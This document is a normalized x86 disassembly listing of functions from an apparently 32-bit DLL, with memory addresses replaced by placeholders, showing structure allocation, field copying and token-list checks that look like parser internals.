mov ebp esp
sub esp 0x8
push esi
mov esi [ edi + 0xc ]
mov [ ebp - 0x8 ] esi
add esi 0x48
cmp [ esi + 0x4 ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x1c ]
push ebx
push 0x58
push edi
mov [ ebp - 0x4 ] eax
call sub_10013bb0
mov ecx [ ebp - 0x4 ]
mov ebx eax
xor eax eax
push esi
push edi
mov [ ebx + 0x4 ] eax
mov [ ebx + 0x8 ] 0xffffffff
mov [ ebx ] ecx
mov [ ebx + 0xc ] eax
call sub_100399a0
mov [ ebx + 0x10 ] eax
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x14 ] edx
mov ecx [ eax + 0x68 ]
mov edx [ ecx + 0x10 ]
sub edx [ esi + 0xc ]
add esp 0x10
mov [ ebx + 0x18 ] edx
mov ecx [ esi + 0x10 ]
mov [ ebx + 0x1c ] ecx
mov edx [ esi + 0x14 ]
mov [ ebx + 0x20 ] edx
mov ecx [ esi + 0x18 ]
mov [ ebx + 0x24 ] ecx
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ edi + 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov eax [ eax ]
mov eax [ edi + 0xc ]
mov ecx [ eax + 0xc ]
test ecx ecx
jne r-xdata
push 0x96
push 0x66
push 0x64
push 0x65
push 0x63
push 0x5f
push ecx
call sub_10073780
add esp 0x1c
test eax eax
je r-xdata
mov edx [ eax + 0x8 ]
mov ecx [ edx + ecx * 4 - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax + ecx * 4 - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
push edi
call sub_100738b0
add esp 0x4
jmp r-xdata
lea ecx [ eax + 0x10 ]
push ecx
mov [ ebx + 0x4 ] eax
mov edx [ ecx + 0x4 ]
push ebx
push edi
mov [ ebx + 0x8 ] edx
call sub_10006860
add esp 0xc
mov eax [ esi ]
mov ecx [ esi + 0x4 ]
push eax
push ecx
push r--data
call sub_100386a0
push esi
push edi
call sub_10028ff0
push esi
push edi
call sub_100503f0
add esp 0x1c
mov [ esi + 0x1c ] 0x5
pop ebx
sub_10073ae0
mov edx [ eax + 0x4 ]
mov [ ecx + 0x30 ] edx
mov edx [ eax + 0x8 ]
mov [ ecx + 0x34 ] edx
mov edx [ eax + 0xc ]
mov [ ecx + 0x38 ] edx
cmp [ eax ] 0x2
jne r-xdata
mov eax r--data
mov edx [ eax ]
mov [ ecx + 0x1c ] edx
mov eax [ eax + 0x4 ]
mov [ ecx + 0x20 ] eax
retn
mov edx [ eax + 0x10 ]
add eax 0x10
mov [ ecx + 0x1c ] edx
mov eax [ eax + 0x4 ]
mov [ ecx + 0x20 ] eax
retn
sub_10073b20
push esi
push edi
mov edi eax
mov esi [ edi + 0xc ]
call sub_100739c0
cmp [ esi + 0xc ] 0x0
jbe r-xdata
lea edx [ esi + 0x8 ]
push edx
push edi
call sub_1001ddd0
add esp 0x8
test eax eax
jne r-xdata
mov eax [ edi + 0xc ]
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov edi [ eax ]
cmp edi 0x1
jne r-xdata
pop edi
pop esi
retn
mov ecx [ ecx + 0x1c ]
push ecx
call sub_1004bc00
push eax
push r--data
call sub_100386a0
add esp 0xc
mov eax [ eax + 0x8 ]
mov ecx [ eax + ecx * 4 - 0x4 ]
xor edx edx
mov ecx [ eax + 0x1c ]
cmp ecx 0xa
jne r-xdata
test edx edx
jne r-xdata
cmp edi 0x1
jne r-xdata
test ecx ecx
jne r-xdata
cmp [ esi + 0x6c ] 0x0
jne r-xdata
pop edi
pop esi
retn
or [ eax + 0xc ] 0x2
jmp r-xdata
mov edi [ eax + 0x1c ]
cmp edi [ ecx + 0x18 ]
je r-xdata
cmp [ esi + 0x70 ] ecx
je r-xdata
mov edx 0x1
jmp r-xdata
mov ecx [ esi + 0x68 ]
mov edx [ ecx + 0x4 ]
mov [ eax + 0x40 ] edx
mov edx [ ecx + 0x8 ]
mov [ eax + 0x44 ] edx
mov edx [ ecx + 0xc ]
mov [ eax + 0x48 ] edx
cmp [ ecx ] 0x2
jne r-xdata
test edx edx
jne r-xdata
mov ecx [ esi + 0x68 ]
cmp [ ecx ] 0x2
jne r-xdata
mov ecx r--data
mov edx [ ecx ]
mov [ eax + 0x2c ] edx
mov ecx [ ecx + 0x4 ]
mov [ eax + 0x30 ] ecx
mov edx [ ecx + 0x10 ]
add ecx 0x10
mov [ eax + 0x2c ] edx
mov ecx [ ecx + 0x4 ]
pop edi
mov [ eax + 0x30 ] ecx
pop esi
retn
sub_10073c00
push edi
mov edi eax
call sub_100739c0
push 0x58
push edi
call sub_10013bb0
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0xffffffff
mov [ eax + 0xc ] ecx
mov [ eax ] 0x4
mov ecx [ esi + 0x18 ]
mov [ eax + 0x10 ] ecx
mov edx [ esi + 0x10 ]
mov [ eax + 0x14 ] edx
mov ecx [ esi + 0x14 ]
mov [ eax + 0x18 ] ecx
mov edx [ esi + 0x4 ]
mov [ eax + 0x1c ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ esi + 0xc ]
mov [ eax + 0x24 ] ecx
add esp 0x8
lea ecx [ ebx + 0x10 ]
push ecx
mov [ eax + 0x4 ] ebx
mov edx [ ecx + 0x4 ]
push eax
push edi
mov [ eax + 0x8 ] edx
call sub_10006860
add esp 0xc
pop edi
retn
sub_10073c70
push 0x96
push 0x66
push 0x0
mov eax esi
call sub_10073470
push eax
call sub_10073780
add esp 0x10
test eax eax
jne r-xdata
retn
lea ecx [ ecx ]
mov eax esi
call sub_10073b20
push 0x96
push 0x66
push 0x0
mov eax esi
call sub_10073470
push eax
call sub_10073780
add esp 0x10
test eax eax
je r-xdata
sub_10073cc0
push 0x96
push 0x5f
push 0x0
mov eax esi
call sub_10073470
push eax
call sub_10073780
add esp 0x10
test eax eax
jne r-xdata
retn
lea ecx [ ecx ]
mov eax esi
call sub_10073b20
push 0x96
push 0x5f
push 0x0
mov eax esi
call sub_10073470
push eax
call sub_10073780
add esp 0x10
test eax eax
je r-xdata
sub_10073d10
push ebp
mov ebp esp
push esi
push edi
push 0x58
push ebx
call sub_10013bb0
mov edi eax
lea esi [ edi + 0x10 ]
push esi
xor eax eax
push 0x1
push ebx
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] 0xffffffff
mov [ edi ] 0x1
mov [ edi + 0xc ] eax
call sub_100417e0
lea eax [ esi + 0x3c ]
push eax
push 0x0
push ebx
call sub_100417e0
mov ecx [ ebp + 0x8 ]
mov [ esi + 0xc ] ecx
mov [ esi + 0x10 ] 0x0
mov edx [ r--data ]
mov [ esi + 0x14 ] edx
mov eax [ r--data ]
mov [ esi + 0x18 ] eax
mov ecx [ r--data ]
mov [ esi + 0x1c ] ecx
mov edx [ r--data ]
mov [ esi + 0x20 ] edx
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x68 ]
mov ecx [ eax + 0x4 ]
mov [ esi + 0x24 ] ecx
mov edx [ eax + 0x8 ]
mov [ esi + 0x28 ] edx
mov eax [ eax + 0xc ]
mov [ esi + 0x2c ] eax
mov ecx [ r--data ]
mov [ esi + 0x30 ] ecx
mov edx [ r--data ]
mov [ esi + 0x34 ] edx
mov eax [ r--data ]
add esp 0x20
mov [ esi + 0x38 ] eax
mov eax edi
pop edi
pop esi
pop ebp
retn
sub_10073dc0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
push esi
push 0x58
push eax
call sub_10013bb0
mov ecx [ ebp + 0x8 ]
mov ebx eax
lea esi [ ebx + 0x10 ]
push esi
xor eax eax
push 0x1
push ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0x8 ] 0xffffffff
mov [ ebx ] 0x1
mov [ ebx + 0xc ] eax
call sub_100417e0
mov edx [ edi + 0x1c ]
mov [ esi + 0x3c ] edx
mov eax [ edi + 0x20 ]
mov [ esi + 0x40 ] eax
mov ecx [ edi + 0x24 ]
mov eax [ ebp + 0xc ]
mov [ esi + 0x44 ] ecx
mov edx [ edi + 0x18 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0xc ] edx
mov ecx [ edi + 0x10 ]
mov [ esi + 0x14 ] ecx
mov edx [ edi + 0x14 ]
mov [ esi + 0x18 ] edx
mov eax [ edi + 0x4 ]
mov [ esi + 0x24 ] eax
mov ecx [ edi + 0x8 ]
mov [ esi + 0x28 ] ecx
mov edx [ edi + 0xc ]
mov [ esi + 0x2c ] edx
mov eax [ r--data ]
mov [ esi + 0x1c ] eax
mov ecx [ r--data ]
mov [ esi + 0x20 ] ecx
mov edx [ r--data ]
mov [ esi + 0x30 ] edx
mov eax [ r--data ]
mov [ esi + 0x34 ] eax
mov ecx [ r--data ]
mov [ esi + 0x38 ] ecx
mov edx [ r--data ]
mov [ edi + 0x1c ] edx
mov eax [ r--data ]
add esp 0x14
mov [ edi + 0x20 ] eax
mov ecx [ r--data ]
pop esi
mov eax ebx
mov [ edi + 0x24 ] ecx
pop ebx
pop ebp
retn
sub_10073e80
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi [ edi + 0xc ]
mov ebx eax
jne r-xdata
cmp [ esi + 0x44 ] 0x0
je r-xdata
call sub_100739c0
mov eax [ edi + 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov eax [ eax ]
mov eax [ edi + 0xc ]
mov ecx [ eax + 0xc ]
test ecx ecx
jne r-xdata
push 0x96
push 0x66
push 0x64
push 0x65
push 0x63
push 0x5f
push ecx
call sub_10073780
add esp 0x1c
test eax eax
je r-xdata
mov eax [ eax + 0x8 ]
mov ecx [ eax + ecx * 4 - 0x4 ]
mov edx [ eax + 0x8 ]
mov eax [ edx + ecx * 4 - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
push edi
call sub_100738b0
add esi 0x8
push esi
push ebx
push edi
call sub_10006860
add esp 0x10
pop edi
pop esi
pop ebx
pop ebp
retn
lea ecx [ eax + 0x10 ]
push ecx
mov [ ebx + 0x4 ] eax
mov eax [ ecx + 0x4 ]
push ebx
push edi
mov [ ebx + 0x8 ] eax
call sub_10006860
add esi 0x8
push esi
push ebx
push edi
call sub_10006860
add esp 0x18
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10073f30
push esi
push 0x0
push ebx
call sub_10073dc0
push 0x0
mov ecx ebx
mov esi eax
call sub_10073e80
mov eax [ esi + 0x1c ]
add esp 0xc
push esi
push eax
call sub_1004bc00
add esp 0x4
push eax
push r--data
call sub_100386a0
add esp 0xc
mov eax esi
pop esi
retn
sub_10073f70
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov ebx ecx
push eax
call sub_10073d10
mov esi eax
or edi 0x1
or [ esi + 0xc ] edi
push 0x0
mov ecx ebx
call sub_10073e80
mov ecx [ ebp + 0x8 ]
add esp 0x8
push esi
push ecx
call sub_1004bc00
add esp 0x4
push eax
push r--data
call sub_100386a0
add esp 0xc
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn
sub_10073fd0
push ebp
mov ebp esp
push ecx
push esi
push edi
mov esi eax
mov eax [ ebp + 0x8 ]
push esi
push eax
mov edi ebx
call sub_10073dc0
mov ecx [ ebp + 0x8 ]
push 0x0
mov [ ebp - 0x4 ] eax
call sub_10073e80
lea edi [ ebx + 0x1c ]
push r--data
push edi
call sub_10069d70
add esp 0x14
test eax eax
je r-xdata
push r--data
push edi
call sub_10069d70
add esp 0x8
test eax eax
je r-xdata
mov esi [ esi * 4 + rw-data ]
push r--data
push edi
call sub_10069d70
add esp 0x8
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
push r--data
push edi
call sub_10069d70
add esp 0x8
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax ebx
call sub_10073670
add esp 0x4
mov ecx [ eax + 0x10 ]
mov eax esi
mov edx [ ebp + 0x8 ]
push edx
mov eax ebx
call sub_10073670
add esp 0x4
mov ecx [ eax + 0x10 ]
mov eax r--data
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
xor ecx ecx
test eax eax
sete cl
mov eax ecx
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
xor ecx ecx
test eax eax
sete cl
mov eax ecx
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
sub_100740e0
push esi
mov esi [ eax + 0xc ]
add esi 0x48
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ edi + 0x18 ]
push esi
push ecx
push eax
call sub_1005ada0
add esp 0xc
cmp [ edi ] 0x5
jne r-xdata
mov ecx [ edi + 0x10 ]
mov [ esi + 0xc ] ecx
mov edx [ edi + 0x4 ]
mov [ esi + 0x10 ] edx
mov ecx [ edi + 0x8 ]
mov [ esi + 0x14 ] ecx
mov edx [ edi + 0xc ]
mov [ esi + 0x18 ] edx
mov edx [ edi + 0x18 ]
push edx
push r--data
call sub_100386a0
add esp 0x8
pop esi
retn
mov [ esi + 0x1c ] 0x2
sub_10074140
push ebp
mov ebp esp
push edi
push 0x0
push esi
mov edi eax
call sub_10073dc0
push 0x0
mov ecx esi
mov edi eax
call sub_10073e80
mov eax [ edi + 0x1c ]
add esp 0xc
push edi
push eax
call sub_1004bc00
add esp 0x4
push eax
push r--data
call sub_100386a0
mov ecx [ ebp + 0x8 ]
push ecx
push esi
call sub_10006e70
mov eax [ esi + 0xc ]
mov edx [ eax ]
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xc ]
add esp 0x14
mov [ eax ] 0x7
pop edi
pop ebp
retn
sub_100741a0
push ebp
mov ebp esp
mov ecx [ eax + 0xc ]
mov eax [ ecx + 0x18 ]
dec eax
js r-xdata
xor eax eax
pop ebp
retn
mov ecx [ ecx + 0x14 ]
lea edx [ ecx + eax * 4 ]
cmp [ ecx ] 0x1
jne r-xdata
sub edx 0x4
dec eax
jns r-xdata
cmp [ ecx + 0x1c ] 0x27
je r-xdata
mov ecx [ edx ]
cmp ecx r--data
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax 0x1
pop ebp
retn
sub_100741e0
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi [ eax + 0xc ]
mov esi [ edi + 0x18 ]
xor eax eax
dec esi
mov [ ebp - 0x4 ] eax
js r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
push ebx
mov eax [ ebp - 0x4 ]
pop ebx
cmp [ eax ] 0x1
jne r-xdata
dec esi
jns r-xdata
mov edx [ eax + 0x1c ]
mov ecx [ ebp + 0x8 ]
cmp edx [ ecx + 0x1c ]
jne r-xdata
mov ecx [ edi + 0x14 ]
mov eax [ ecx + esi * 4 ]
cmp eax r--data
je r-xdata
mov edx [ eax + 0x20 ]
cmp edx [ ecx + 0x20 ]
jne r-xdata
add ecx 0x4c
push ecx
lea ebx [ eax + 0x4c ]
call sub_100732f0
add esp 0x4
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
inc [ ebp - 0x4 ]
mov [ eax ] esi
sub_10074250
push ebp
mov ebp esp
push ecx
push esi
mov esi [ edi + 0xc ]
add esi 0x14
cmp ebx r--data
jne r-xdata
push r--data
push r--data
jmp r-xdata
push esi
push ebx
push edi
call sub_10006860
add esp 0xc
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
push edx
push r--data
call sub_100386a0
mov eax [ ebp - 0x4 ]
push esi
push eax
push edi
call sub_100307a0
add esp 0x14
call sub_100386a0
mov eax [ esi + 0x4 ]
add esp 0x4
lea ecx [ ebp - 0x4 ]
push ecx
mov [ ebp - 0x4 ] eax
push ebx
mov eax edi
call sub_100741e0
add esp 0x8
cmp eax 0x3
jl r-xdata
sub_100742c0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ eax + 0xc ]
push esi
mov esi [ ebx + 0x18 ]
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebx + 0x14 ]
dec esi
lea ecx [ ecx + esi * 4 ]
push edi
mov edi [ ecx ]
mov [ ebp - 0x4 ] ecx
cmp edi r--data
je r-xdata
pop edi
mov edx [ ebx + 0xc ]
xor eax eax
test edx edx
je r-xdata
test esi esi
je r-xdata
mov ecx [ ebx + 0x8 ]
lea esp [ esp ]
or esi 0xffffffff
mov edi [ ecx - 0x4 ]
sub ecx 0x4
dec esi
mov [ ebp - 0x4 ] ecx
cmp edi r--data
je r-xdata
inc eax
add ecx 0x4
cmp eax edx
jb r-xdata
mov eax [ eax + 0x1c ]
push eax
call sub_1004bc00
push eax
push esi
push r--data
call sub_100386a0
add esp 0x10
cmp esi [ ebx + 0x18 ]
jae r-xdata
mov edx [ ebx + 0x8 ]
mov eax [ edx + eax * 4 - 0x4 ]
mov eax [ ebx + 0xc ]
inc esi
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
xor eax eax
test edx edx
je r-xdata
cmp [ ecx ] edi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov ecx [ ebx + 0x14 ]
mov eax [ ecx + esi * 4 ]
mov edx [ ebp + 0x8 ]
push 0x80
push eax
push edx
call sub_100491a0
mov ecx [ ebp + 0x8 ]
push 0x1
mov edi eax
call sub_10073e80
mov eax [ ebx + 0x14 ]
add esp 0x10
mov [ eax + esi * 4 ] edi
mov ecx [ edi + 0x1c ]
push esi
push ecx
call sub_1004bc00
add esp 0x4
push eax
push r--data
call sub_100386a0
inc esi
add esp 0xc
cmp esi [ ebx + 0x18 ]
jb r-xdata
mov ecx [ ebx + 0x8 ]
inc eax
add ecx 0x4
cmp eax edx
jb r-xdata
cmp [ ecx ] edi
je r-xdata
mov ecx [ ebp - 0x4 ]
jmp r-xdata
sub_100743d0
push esi
mov esi [ ebx + 0xc ]
push edi
add esi 0x14
xor edi edi
lea ebx [ ebx ]
push edi
push r--data
call sub_100386a0
add esp 0x8
pop edi
pop esi
retn
cmp eax r--data
jne r-xdata
push esi
push ebx
call sub_1001ddd0
add esp 0x8
inc edi
test eax eax
je r-xdata
sub_10074410
cmp [ esi + 0xc ] 0x0
push ebx
push edi
jne r-xdata
pop edi
mov eax 0x1
pop ebx
retn
mov eax [ esi ]
mov ecx r--data
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
mov edi [ esi + 0x4 ]
xor ebx ebx
mov eax r--data
call sub_10073490
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov edi [ esi + 0x4 ]
lea ebx [ eax + 0x1 ]
mov eax r--data
call sub_10073490
test eax eax
jne r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov edi [ esi + 0x8 ]
mov eax r--data
call sub_10073490
test eax eax
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
mov edi [ esi + 0x4 ]
xor ebx ebx
mov eax r--data
call sub_10073490
test eax eax
je r-xdata
mov edi [ esi + 0x4 ]
xor ebx ebx
mov eax r--data
call sub_10073490
test eax eax
jne r-xdata
cmp [ esi + 0x14 ] ebx
je r-xdata
pop edi
mov eax 0x2
pop ebx
retn
mov edi [ esi + 0x4 ]
mov eax r--data
call sub_10073490
test eax eax
je r-xdata
pop edi
xor eax eax
pop ebx
retn
cmp [ esi + 0x14 ] ebx
jne r-xdata
sub_100744e0
push ebp
mov ebp esp
sub esp 0x14
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebx + 0xc ]
push edi
lea eax [ ebp - 0x14 ]
push eax
push 0xa
push ebx
call sub_100417e0
mov eax [ ebp + 0x14 ]
add esp 0xc
cmp eax 0x96
je r-xdata
mov edi [ esi + 0xc ]
dec edi
mov [ ebp - 0x8 ] 0x0
js r-xdata
lea edi [ ebp + 0x14 ]
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
push ebx
call sub_1001cd60
mov eax [ ebp - 0x8 ]
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ esi + 0x8 ]
mov ebx [ ebp - 0x10 ]
lea eax [ edx + edi * 4 ]
mov [ ebp - 0x4 ] eax
lea ecx [ ebp - 0x14 ]
push ecx
push eax
push ebx
call sub_10006860
mov eax [ edi + 0x4 ]
add edi 0x4
add esp 0xc
cmp eax 0x96
jne r-xdata
sub [ ebp - 0x4 ] 0x4
dec edi
jns r-xdata
mov edx [ ebp + 0xc ]
mov esi [ eax + 0x1c ]
mov ecx [ edx + 0x4 ]
xor eax eax
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx ]
cmp [ eax ] 0x1
jne r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
test ebx ebx
je r-xdata
mov edx [ edx ]
nop
mov ebx [ ebp + 0x8 ]
cmp [ ebp + 0x10 ] ecx
jne r-xdata
mov edx [ ebp - 0x14 ]
cmp [ edx + eax * 4 ] esi
je r-xdata
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
inc eax
add edx 0x4
cmp eax ecx
jb r-xdata
mov [ ebp - 0x8 ] 0x0
mov ecx 0x1
inc eax
cmp eax ebx
jb r-xdata
cmp esi [ edx ]
je r-xdata
jmp r-xdata
sub_100745c0
push ebp
mov ebp esp
sub esp 0x10
push 0x96
push 0x2
push 0x5e
push 0x5d
push 0x5b
push 0x58
push 0x57
push 0x56
push 0x55
push 0x54
push 0x4a
push 0x90
push 0x68
push 0x67
push 0x5f
push 0x0
push 0x60
mov [ ebp - 0x4 ] eax
push 0x7c
mov eax 0x1
push 0x0
lea edx [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x4 ]
push eax
mov [ ebp - 0x10 ] ecx
call sub_100744e0
add esp 0x54
mov esp ebp
pop ebp
retn
sub_10074620
mov eax [ eax + 0xc ]
push esi
mov esi [ eax + 0xc ]
dec esi
push edi
js r-xdata
pop edi
xor eax eax
pop esi
retn
mov ecx [ eax + 0x8 ]
lea edi [ ecx + esi * 4 ]
pop edi
mov eax 0x1
pop esi
retn
cmp [ eax ] 0x1
jne r-xdata
sub edi 0x4
dec esi
jns r-xdata
push 0x96
push 0x2
push 0x5e
push 0x5d
push 0x5b
push 0x58
push 0x57
push 0x56
push 0x55
push 0x54
push 0x4a
push 0x90
push 0x68
push 0x67
push 0x5f
push 0x0
push 0x60
push 0x7c
push eax
call sub_10073780
add esp 0x4c
test eax eax
jne r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
sub_10074690
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0x8 ]
push edi
lea eax [ ebp - 0xc ]
push eax
push 0x6
push esi
call sub_100417e0
mov eax [ ebp + 0xc ]
add esp 0xc
cmp eax 0x96
je r-xdata
push 0x96
push 0x2
push 0x5e
push 0x5d
push 0x5b
push 0x58
push 0x57
push 0x56
push 0x55
push 0x54
push 0x4a
push 0x90
push 0x68
push 0x67
push 0x5f
push 0x0
push 0x60
push 0x7c
push 0x0
lea edx [ ebp - 0xc ]
push edx
push esi
call sub_100744e0
mov edi eax
lea eax [ ebp - 0xc ]
push eax
push esi
call sub_1001cd60
add esp 0x5c
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn
lea edi [ ebp + 0xc ]
lea ecx [ ebp - 0xc ]
push ecx
push eax
push esi
call sub_10006860
mov eax [ edi + 0x4 ]
add edi 0x4
add esp 0xc
cmp eax 0x96
jne r-xdata
sub_10074720
push ebp
mov ebp esp
sub esp 0x10
push 0x96
push 0x1e
push 0x1d
push 0x2
push 0x5e
push 0x5d
push 0x5b
push 0x58
push 0x57
push 0x56
push 0x55
push 0x54
push 0x4a
push 0x90
push 0x68
push 0x67
push 0x5f
push 0x0
push 0x60
mov [ ebp - 0x4 ] eax
push 0x7c
mov eax 0x1
push 0x0
lea edx [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x4 ]
push eax
mov [ ebp - 0x10 ] ecx
call sub_100744e0
add esp 0x5c
mov esp ebp
pop ebp
retn
sub_10074780
push ebp
mov ebp esp
sub esp 0x10
push 0x96
push 0x6e
push 0x2
push 0x5e
push 0x5d
push 0x5b
push 0x58
push 0x57
push 0x56
push 0x55
push 0x54
push 0x4a
push 0x90
push 0x68
push 0x67
push 0x5f
push 0x0
push 0x60
mov [ ebp - 0x4 ] eax
push 0x7c
mov eax 0x1
push 0x0
lea edx [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x4 ]
push eax
mov [ ebp - 0x10 ] ecx
call sub_100744e0
add esp 0x58
mov esp ebp
pop ebp
retn
sub_100747e0
push ebp
mov ebp esp
sub esp 0x10
push 0x96
push 0x5f
mov [ ebp - 0x4 ] eax
push 0x0
mov eax 0x1
push 0x0
lea edx [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x4 ]
push eax
mov [ ebp - 0x10 ] ecx
call sub_100744e0
add esp 0x18
mov esp ebp
pop ebp
retn
sub_10074820
push ebp
mov ebp esp
sub esp 0x10
push 0x96
push 0x72
mov [ ebp - 0x4 ] eax
mov eax 0x1
push 0x71
push eax
lea edx [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x4 ]
push eax
mov [ ebp - 0x10 ] ecx
call sub_100744e0
add esp 0x18
mov esp ebp
pop ebp
retn
sub_10074860
push 0x96
push 0x3d
push 0x3e
push 0x19
push 0x71
push 0x72
push 0x1f
push 0x21
push 0x22
mov eax esi
call sub_10073470
push eax
call sub_10073780
add esp 0x28
test eax eax
je r-xdata
retn
lea esp [ esp ]
mov eax esi
call sub_10073b20
push 0x96
push 0x3d
push 0x3e
push 0x19
push 0x71
push 0x72
push 0x1f
push 0x21
push 0x22
mov eax esi
call sub_10073470
push eax
call sub_10073780
add esp 0x28
test eax eax
jne r-xdata
push edi
mov eax esi
call sub_10073470
call sub_100737d0
add esp 0x4
test eax eax
jne r-xdata
sub_100748e0
push ebp
mov ebp esp
sub esp 0x10
push 0x96
push 0x5f
push 0x0
push 0x0
lea ecx [ ebp - 0x10 ]
push ecx
lea eax [ ebp - 0x4 ]
push esi
mov [ ebp - 0x4 ] 0x5f
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x8 ] 0x1
call sub_100744e0
add esp 0x18
test eax eax
jne r-xdata
mov eax esi
call sub_10073b20
cmp [ eax ] 0x1
jne r-xdata
mov esp ebp
pop ebp
retn
cmp [ eax + 0x1c ] 0x5f
jne r-xdata
mov eax esi
call sub_10073500
mov eax 0x1
mov esp ebp
pop ebp
retn
sub_10074950
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi 0x96
mov ebx eax
mov [ ebp - 0x4 ] 0x1
call sub_10074860
mov eax [ esi + 0xc ]
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
cmp [ ecx ] 0x1
jne r-xdata
mov eax [ eax + 0x8 ]
mov ecx [ eax + ecx * 4 - 0x4 ]
mov eax [ ebp + 0x8 ]
push esi
call sub_10073670
add esp 0x4
mov [ ebp - 0x4 ] 0x0
lea ebx [ ebx ]
cmp [ ecx + 0x1c ] ebx
je r-xdata
mov eax esi
call sub_10073b20
cmp [ eax ] 0x1
jne r-xdata
cmp [ eax + 0x1c ] ebx
jne r-xdata
mov edi [ esi + 0xc ]
add edi 0x14
xor ebx ebx
lea esp [ esp ]
push ebx
push r--data
call sub_100386a0
mov ecx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
add esp 0x8
pop edi
pop esi
mov [ ecx ] 0xd
pop ebx
mov esp ebp
pop ebp
retn
cmp eax r--data
jne r-xdata
push edi
push esi
call sub_1001ddd0
add esp 0x8
inc ebx
test eax eax
je r-xdata
sub_10074a00
push ebp
mov ebp esp
sub esp 0x10
push 0x96
push 0x5f
push 0x0
lea eax [ ebp - 0x4 ]
push 0x0
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax 0x1
push ecx
push esi
mov [ ebp - 0x4 ] 0x67
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
call sub_100744e0
add esp 0x18
test eax eax
push edi
mov ecx esi
mov eax 0x67
jne r-xdata
call sub_10074950
add esp 0x4
mov esp ebp
